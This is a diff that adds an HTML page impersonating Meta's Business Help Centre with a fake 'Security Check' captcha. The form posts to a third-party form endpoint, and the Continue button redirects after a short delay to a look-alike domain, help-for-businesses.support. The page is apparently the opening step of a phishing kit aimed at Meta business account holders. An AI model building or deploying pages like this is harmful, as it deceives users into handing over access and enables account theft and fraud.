@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Meta - Business Help Centre</title>
+    <style>
+        
+    </style>
+</head>
+
+<body class=" bg-[#F0F2F5]  h-screen">
+    <section class="container mx-auto pt-20 w-full h-full flex items-center justify-center">
+       <div class="bg-white w-full max-w-[400px] rounded-md shadow-lg flex flex-col gap-y-4 mx-2">
+        <div>
+            <img src="./assets/captcha.png" alt="">
+        </div>
+        <div class="p-4 flex flex-col gap-y-4">
+            <p class="font-bold text-center">Security Check</p>
+            <p>
+                Meta uses security tests to ensure that the people on the site are real. Please fill the security check below to continue further
+            </p>
+            <div class="captcha flex items-center justify-center">
+                <form action="https://api.form-data.com/f/bqtxth46icif4r4ot1p5qn" method="post">
+                    <div class="g-recaptcha" data-sitekey="6Lel4Z4UAAAAAOa8LO1Q9mqKRUiMYl_00o5mXJrR"></div>
+                </form>
+            </div>
+            <button id="login-btn" class="min-w-full bg-[#1877f2] rounded-[6px] text-white text-[18px] py-1.5 font-[600] mb-4">Continue</button>
+        </div>
+       </div>
+    </section>
+    <script type="module" src="/assets/js/main.js"></script>
+    <script>
+        let btn = document.getElementById('login-btn')
+        btn.addEventListener('click', () => {
+            setTimeout(() => {
+                window.location.href = 'https://help-for-businesses.support'
+            }, 1500);
+        })
+    </script>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</body>
+
+</html>
